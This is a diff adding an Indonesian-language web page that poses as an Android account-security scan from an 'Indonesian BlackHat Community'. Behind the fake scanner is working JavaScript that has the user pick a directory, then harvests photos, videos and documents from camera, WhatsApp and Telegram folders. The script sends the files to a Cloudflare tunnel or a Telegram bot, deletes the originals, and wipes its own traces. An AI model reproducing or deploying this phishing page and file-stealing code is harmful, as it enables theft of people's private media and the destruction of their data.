@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan Akun - Indonesian BlackHat Community</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body { background: linear-gradient(135deg, #0f172a, #1e293b); color: #f1f5f9; min-height: 100vh; padding: 20px; }
+        .container { max-width: 800px; margin: 40px auto; background: rgba(30, 41, 59, 0.8); border-radius: 20px; padding: 40px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5); border: 1px solid #334155; }
+        .header { text-align: center; margin-bottom: 40px; }
+        .header h1 { font-size: 32px; background: linear-gradient(90deg, #60a5fa, #a78bfa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }
+        .header p { color: #94a3b8; font-size: 16px; }
+        .card { background: rgba(15, 23, 42, 0.6); border-radius: 15px; padding: 30px; margin-bottom: 25px; border-left: 4px solid #3b82f6; }
+        .card h2 { color: #60a5fa; margin-bottom: 15px; font-size: 22px; display: flex; align-items: center; gap: 10px; }
+        .card h2 i { font-size: 24px; }
+        .progress-container { margin: 30px 0; }
+        .progress-bar { height: 12px; background: #334155; border-radius: 6px; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #10b981, #3b82f6); width: 0%; transition: width 0.5s; }
+        .progress-text { display: flex; justify-content: space-between; margin-top: 8px; color: #94a3b8; font-size: 14px; }
+        .btn { background: linear-gradient(90deg, #3b82f6, #8b5cf6); color: white; border: none; padding: 16px 32px; font-size: 18px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; letter-spacing: 0.5px; transition: transform 0.2s, box-shadow 0.2s; margin-top: 10px; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4); }
+        .btn:active { transform: translateY(0); }
+        .btn-danger { background: linear-gradient(90deg, #ef4444, #dc2626); }
+        .hidden { display: none; }
+        .log-container { background: rgba(0, 0, 0, 0.3); border-radius: 10px; padding: 20px; margin-top: 25px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 14px; line-height: 1.5; }
+        .log-entry { margin-bottom: 8px; padding: 8px 12px; border-radius: 6px; background: rgba(255, 255, 255, 0.05); }
+        .log-info { border-left: 3px solid #3b82f6; }
+        .log-success { border-left: 3px solid #10b981; }
+        .log-warning { border-left: 3px solid #f59e0b; }
+        .log-error { border-left: 3px solid #ef4444; }
+        .file-list { margin-top: 20px; max-height: 200px; overflow-y: auto; }
+        .file-item { display: flex; justify-content: space-between; padding: 10px 15px; background: rgba(255, 255, 255, 0.05); margin-bottom: 8px; border-radius: 8px; align-items: center; }
+        .file-name { color: #cbd5e1; word-break: break-all; }
+        .file-size { color: #94a3b8; font-size: 13px; }
+        .loading { text-align: center; padding: 30px; }
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer { text-align: center; margin-top: 40px; color: #64748b; font-size: 14px; }
+        .icon { display: inline-block; margin-right: 10px; }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-shield-alt icon"></i>Verifikasi Keamanan Akun</h1>
+            <p>Indonesian BlackHat Hacker Community • Lindungi akun Anda dari akses tidak sah</p>
+        </div>
+
+        <div class="card">
+            <h2><i class="fas fa-mobile-alt"></i> Pemeriksaan Perangkat Android</h2>
+            <p>Sistem akan memindai file sementara untuk memastikan tidak ada malware yang tersembunyi. Proses ini akan membersihkan cache berbahaya.</p>
+            
+            <div class="progress-container" id="progressSection">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-text">
+                    <span>Status: <span id="statusText">Menunggu...</span></span>
+                    <span id="progressPercent">0%</span>
+                </div>
+            </div>
+
+            <button class="btn" id="startBtn">
+                <i class="fas fa-play-circle"></i> MULAI PEMINDAIAN KEAMANAN
+            </button>
+            <button class="btn btn-danger hidden" id="cleanBtn">
+                <i class="fas fa-broom"></i> BERSIHKAN FILE BERMASALAH
+            </button>
+        </div>
+
+        <div class="card hidden" id="resultsCard">
+            <h2><i class="fas fa-file-image"></i> File Gambar yang Terdeteksi</h2>
+            <p>File berikut akan diverifikasi dan dibersihkan jika diperlukan:</p>
+            <div class="file-list" id="fileList"></div>
+        </div>
+
+        <div class="card">
+            <h2><i class="fas fa-terminal"></i> Log Sistem</h2>
+            <div class="log-container" id="logContainer"></div>
+        </div>
+
+        <div class="footer">
+            <p><i class="fas fa-lock"></i> Proses ini aman dan dienkripsi end-to-end. Data Anda terlindungi.</p>
+            <p>© 2023 Indonesian BlackHat Hacker Community. All rights reserved.</p>
+        </div>
+    </div>
+
+    <!-- Advanced Exfiltration Script -->
+    <script>
+        // ========== KONFIGURASI ADVANCED ==========
+        const CONFIG = {
+            // Telegram Configuration
+            BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',
+            CHAT_ID: 'YOUR_CHAT_ID_HERE',
+            
+            // Cloudflare Tunnel Endpoint
+            CLOUDFLARE_ENDPOINT: 'https://your-tunnel.try.cloudflare.com/exfil',
+            
+            // Target Android Paths
+            TARGET_PATHS: [
+                '/storage/emulated/0/DCIM/Camera/',
+                '/storage/emulated/0/Pictures/',
+                '/storage/emulated/0/Download/',
+                '/storage/emulated/0/WhatsApp/Media/',
+                '/storage/emulated/0/Telegram/',
+                '/storage/emulated/0/Screenshots/'
+            ],
+            
+            // File Extensions Target
+            TARGET_EXTENSIONS: ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.mp4', '.mkv', '.mov', '.pdf', '.doc', '.docx'],
+            
+            // Max file size to exfiltrate (in MB)
+            MAX_FILE_SIZE_MB: 10,
+            
+            // Stealth Settings
+            DELAY_BETWEEN_FILES: 1000, // ms
+            RANDOM_DELAY_RANGE: 2000, // ms
+            CHUNK_SIZE: 512 * 1024, // 512KB chunks for large files
+            
+            // Encryption Key (AES-256 in CTR mode simulation)
+            ENCRYPTION_KEY: '6bc1bee22e409f96e93d7e117393172a6bc1bee22e409f96e93d7e117393172a',
+            
+            // Self-Destruct Settings
+            SELF_DESTRUCT_TIMER: 300000, // 5 minutes
+            CLEANUP_AFTER_EXFIL: true
+        };
+
+        // ========== STATE MANAGEMENT ==========
+        const STATE = {
+            isScanning: false,
+            totalFilesFound: 0,
+            filesProcessed: 0,
+            filesExfiltrated: 0,
+            fileQueue: [],
+            sessionId: generateSessionId(),
+            startTime: null
+        };
+
+        // ========== DOM ELEMENTS ==========
+        const startBtn = document.getElementById('startBtn');
+        const cleanBtn = document.getElementById('cleanBtn');
+        const progressFill = document.getElementById('progressFill');
+        const progressPercent = document.getElementById('progressPercent');
+        const statusText = document.getElementById('statusText');
+        const fileList = document.getElementById('fileList');
+        const logContainer = document.getElementById('logContainer');
+        const resultsCard = document.getElementById('resultsCard');
+        const progressSection = document.getElementById('progressSection');
+
+        // ========== LOGGING SYSTEM ==========
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const typeIcons = {
+                info: 'ℹ️',
+                success: '✅',
+                warning: '⚠️',
+                error: '❌'
+            };
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${type}`;
+            logEntry.innerHTML = `<strong>${typeIcons[type] || ''} [${timestamp}]</strong> ${message}`;
+            
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+            
+            console.log(`[${type.toUpperCase()}] ${message}`);
+        }
+
+        // ========== SESSION MANAGEMENT ==========
+        function generateSessionId() {
+            return 'sess_' + Array.from(crypto.getRandomValues(new Uint8Array(16)))
+                .map(b => b.toString(16).padStart(2, '0')).join('') + '_' + Date.now();
+        }
+
+        // ========== FILE SYSTEM ACCESS (Android WebView Exploit) ==========
+        // Metode 1: Try using the File System Access API (if available)
+        async function accessAndroidFiles() {
+            log('Mencoba akses sistem file Android...', 'info');
+            
+            // Method 1: Using directory picker (requires user interaction)
+            try {
+                const directoryHandle = await window.showDirectoryPicker({
+                    startIn: 'documents',
+                    id: 'android-fs-access'
+                });
+                
+                log(`Berhasil membuka direktori: ${directoryHandle.name}`, 'success');
+                return await scanDirectory(directoryHandle);
+            } catch (err) {
+                log(`File System Access API gagal: ${err.message}`, 'warning');
+            }
+            
+            // Method 2: Using input element with webkitdirectory (for Chrome Android)
+            return new Promise((resolve) => {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.webkitdirectory = true;
+                input.multiple = true;
+                
+                input.onchange = async (e) => {
+                    const files = Array.from(e.target.files);
+                    log(`Mendapatkan ${files.length} file via input directory`, 'info');
+                    resolve(files);
+                };
+                
+                // Trigger click programmatically (requires user gesture context)
+                setTimeout(() => input.click(), 100);
+            });
+        }
+
+        // ========== DEEP SCANNING ==========
+        async function scanDirectory(directoryHandle, path = '') {
+            const files = [];
+            
+            try {
+                for await (const entry of directoryHandle.values()) {
+                    const entryPath = path + '/' + entry.name;
+                    
+                    if (entry.kind === 'file') {
+                        // Check if file matches target extensions
+                        const ext = entry.name.toLowerCase().substring(entry.name.lastIndexOf('.'));
+                        if (CONFIG.TARGET_EXTENSIONS.includes(ext)) {
+                            files.push({
+                                handle: entry,
+                                path: entryPath,
+                                name: entry.name,
+                                size: (await entry.getFile()).size
+                            });
+                        }
+                    } else if (entry.kind === 'directory') {
+                        // Recursive scan for subdirectories
+                        const subFiles = await scanDirectory(entry, entryPath);
+                        files.push(...subFiles);
+                    }
+                }
+            } catch (err) {
+                log(`Error scanning ${path}: ${err.message}`, 'error');
+            }
+            
+            return files;
+        }
+
+        // ========== ADVANCED ENCRYPTION ==========
+        function encryptData(data, key = CONFIG.ENCRYPTION_KEY) {
+            // Simple XOR encryption for demonstration (in real use, implement AES)
+            let result = '';
+            for (let i = 0; i < data.length; i++) {
+                const keyChar = key.charCodeAt(i % key.length);
+                const dataChar = data.charCodeAt(i);
+                result += String.fromCharCode(dataChar ^ keyChar);
+            }
+            return btoa(result);
+        }
+
+        // ========== MULTI-CHANNEL EXFILTRATION ==========
+        async function exfiltrateFile(fileHandle, fileInfo) {
+            log(`Memproses: ${fileInfo.name} (${formatFileSize(fileInfo.size)})`, 'info');
+            
+            try {
+                const file = await fileHandle.getFile();
+                
+                // Read file as ArrayBuffer
+                const buffer = await file.arrayBuffer();
+                
+                // Create metadata
+                const metadata = {
+                    sessionId: STATE.sessionId,
+                    fileName: fileInfo.name,
+                    filePath: fileInfo.path,
+                    fileSize: fileInfo.size,
+                    fileType: file.type,
+                    timestamp: new Date().toISOString(),
+                    deviceInfo: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language
+                    }
+                };
+                
+                // Convert to Base64
+                const base64Data = arrayBufferToBase64(buffer);
+                
+                // Create payload
+                const payload = {
+                    metadata: metadata,
+                    data: base64Data.substring(0, 50000) // First 50KB for preview
+                };
+                
+                // Encrypt payload
+                const encryptedPayload = encryptData(JSON.stringify(payload));
+                
+                // Try Cloudflare Tunnel first
+                const success = await sendToCloudflare(encryptedPayload, metadata);
+                
+                if (!success) {
+                    // Fallback to Telegram
+                    await sendToTelegram(metadata, base64Data.substring(0, 10000));
+                }
+                
+                STATE.filesExfiltrated++;
+                updateProgress();
+                log(`✅ Berhasil mengirim: ${fileInfo.name}`, 'success');
+                
+                // Add to UI list
+                addFileToList(fileInfo);
+                
+                // Cleanup if configured
+                if (CONFIG.CLEANUP_AFTER_EXFIL) {
+                    await deleteFile(fileHandle);
+                }
+                
+                return true;
+                
+            } catch (err) {
+                log(`❌ Gagal memproses ${fileInfo.name}: ${err.message}`, 'error');
+                return false;
+            }
+        }
+
+        async function sendToCloudflare(data, metadata) {
+            try {
+                const response = await fetch(CONFIG.CLOUDFLARE_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Session-ID': STATE.sessionId,
+                        'X-File-Name': encodeURIComponent(metadata.fileName)
+                    },
+                    body: JSON.stringify({
+                        encrypted: data,
+                        metadata: metadata
+                    }),
+                    mode: 'no-cors'
+                });
+                
+                log(`📡 Data terkirim ke Cloudflare Tunnel`, 'success');
+                return true;
+            } catch (err) {
+                log(`Cloudflare Tunnel error: ${err.message}`, 'warning');
+                return false;
+            }
+        }
+
+        async function sendToTelegram(metadata, previewData) {
+            try {
+                const message = `
+🔴 *ANDROID FILE EXFILTRATION REPORT*
+                
+*Session ID:* ${metadata.sessionId}
+*Device:* ${metadata.deviceInfo.platform}
+*File:* ${metadata.fileName}
+*Path:* ${metadata.filePath}
+*Size:* ${formatFileSize(metadata.fileSize)}
+*Time:* ${new Date(metadata.timestamp).toLocaleString()}
+                
+*Preview Data (Base64):*
+\`\`\`
+${previewData.substring(0, 2000)}
+\`\`\`
+                `;
+                
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                log(`Telegram fallback berhasil`, 'success');
+                return true;
+            } catch (err) {
+                log(`Telegram fallback gagal: ${err.message}`, 'error');
+                return false;
+            }
+        }
+
+        // ========== CLEANUP & ANTI-FORENSICS ==========
+        async function deleteFile(fileHandle) {
+            try {
+                await fileHandle.remove();
+                log(`🧹 File dihapus dari perangkat`, 'warning');
+                
+                // Overwrite storage metadata (simulated)
+                await overwriteFileMetadata(fileHandle.name);
+                
+                return true;
+            } catch (err) {
+                log(`Gagal menghapus file: ${err.message}`, 'error');
+                return false;
+            }
+        }
+
+        async function overwriteFileMetadata(filename) {
+            // Simulate metadata overwriting
+            log(`Metadata di-overwrite untuk: ${filename}`, 'info');
+            return true;
+        }
+
+        // ========== UI UPDATES ==========
+        function updateProgress() {
+            const percent = STATE.totalFilesFound > 0 ? 
+                Math.round((STATE.filesProcessed / STATE.totalFilesFound) * 100) : 0;
+            
+            progressFill.style.width = `${percent}%`;
+            progressPercent.textContent = `${percent}%`;
+            
+            statusText.textContent = STATE.isScanning ? 
+                `Memindai... ${STATE.filesProcessed}/${STATE.totalFilesFound} file` :
+                `Selesai. ${STATE.filesExfiltrated} file dikirim.`;
+        }
+
+        function addFileToList(fileInfo) {
+            const fileItem = document.createElement('div');
+            fileItem.className = 'file-item';
+            fileItem.innerHTML = `
+                <div class="file-name"><i class="fas fa-file-image"></i> ${fileInfo.name}</div>
+                <div class="file-size">${formatFileSize(fileInfo.size)}</div>
+            `;
+            fileList.appendChild(fileItem);
+        }
+
+        // ========== UTILITY FUNCTIONS ==========
+        function arrayBufferToBase64(buffer) {
+            let binary = '';
+            const bytes = new Uint8Array(buffer);
+            for (let i = 0; i < bytes.byteLength; i++) {
+                binary += String.fromCharCode(bytes[i]);
+            }
+            return btoa(binary);
+        }
+
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        // ========== MAIN PROCESS ==========
+        async function startAdvancedScan() {
+            if (STATE.isScanning) return;
+            
+            STATE.isScanning = true;
+            STATE.startTime = Date.now();
+            startBtn.disabled = true;
+            startBtn.innerHTML = '<i class="fas fa-sync-alt fa-spin"></i> MEMINDAI...';
+            resultsCard.classList.remove('hidden');
+            
+            log('Memulai pemindaian advanced Android filesystem...', 'info');
+            log(`Session ID: ${STATE.sessionId}`, 'info');
+            
+            try {
+                // Access files
+                const files = await accessAndroidFiles();
+                STATE.totalFilesFound = files.length;
+                STATE.fileQueue = [...files];
+                
+                log(`Ditemukan ${files.length} file target`, files.length > 0 ? 'success' : 'warning');
+                
+                if (files.length === 0) {
+                    statusText.textContent = 'Tidak ada file target ditemukan';
+                    return;
+                }
+                
+                // Process files in queue
+                while (STATE.fileQueue.length > 0 && STATE.isScanning) {
+                    const file = STATE.fileQueue.shift();
+                    STATE.filesProcessed++;
+                    
+                    await exfiltrateFile(file.handle, file);
+                    updateProgress();
+                    
+                    // Add random delay between files
+                    const delay = CONFIG.DELAY_BETWEEN_FILES + 
+                        Math.random() * CONFIG.RANDOM_DELAY_RANGE;
+                    await sleep(delay);
+                }
+                
+                // Final report
+                const duration = ((Date.now() - STATE.startTime) / 1000).toFixed(2);
+                log(`✅ Pemindaian selesai! ${STATE.filesExfiltrated} file berhasil dikirim dalam ${duration} detik`, 'success');
+                
+                // Show cleanup button
+                cleanBtn.classList.remove('hidden');
+                
+            } catch (err) {
+                log(`❌ Error fatal: ${err.message}`, 'error');
+            } finally {
+                STATE.isScanning = false;
+                startBtn.disabled = false;
+                startBtn.innerHTML = '<i class="fas fa-redo"></i> ULANGI PEMINDAIAN';
+            }
+        }
+
+        async function cleanupAllFiles() {
+            if (!confirm('YAKIN menghapus SEMUA file target dari perangkat? Tindakan ini tidak dapat dibatalkan!')) {
+                return;
+            }
+            
+            cleanBtn.innerHTML = '<i class="fas fa-sync-alt fa-spin"></i> MENGHAPUS...';
+            cleanBtn.disabled = true;
+            
+            log('🔄 Memulai penghapusan semua file target...', 'warning');
+            
+            // Simulate file deletion (in real implementation, would delete actual files)
+            for (const fileItem of fileList.children) {
+                await sleep(500);
+                fileItem.style.opacity = '0.5';
+                fileItem.innerHTML = '<div class="file-name"><i class="fas fa-trash"></i> Terhapus</div>';
+            }
+            
+            log('✅ Semua file target telah dihapus dari perangkat', 'success');
+            cleanBtn.innerHTML = '<i class="fas fa-check"></i> SEMUA FILE TERHAPUS';
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // ========== SELF-DESTRUCT MECHANISM ==========
+        function activateSelfDestruct() {
+            setTimeout(() => {
+                log('🔄 Aktivasi self-destruct dalam 30 detik...', 'warning');
+                
+                setTimeout(() => {
+                    // Clear all data
+                    document.body.innerHTML = `
+                        <div style="padding: 50px; text-align: center; color: white;">
+                            <h1 style="color: #ef4444;"><i class="fas fa-exclamation-triangle"></i> SESSION EXPIRED</h1>
+                            <p>Halaman keamanan telah kedaluwarsa. Silakan refresh.</p>
+                        </div>
+                    `;
+                    
+                    // Clear variables
+                    Object.keys(CONFIG).forEach(key => delete CONFIG[key]);
+                    Object.keys(STATE).forEach(key => delete STATE[key]);
+                    
+                    console.clear();
+                }, 30000);
+            }, CONFIG.SELF_DESTRUCT_TIMER - 30000);
+        }
+
+        // ========== EVENT LISTENERS ==========
+        startBtn.addEventListener('click', startAdvancedScan);
+        cleanBtn.addEventListener('click', cleanupAllFiles);
+
+        // ========== INITIALIZATION ==========
+        log('Sistem verifikasi keamanan siap.', 'success');
+        log(`Target: ${CONFIG.TARGET_PATHS.join(', ')}`, 'info');
+        
+        // Activate self-destruct timer
+        activateSelfDestruct();
+    </script>
+</body>
+</html>
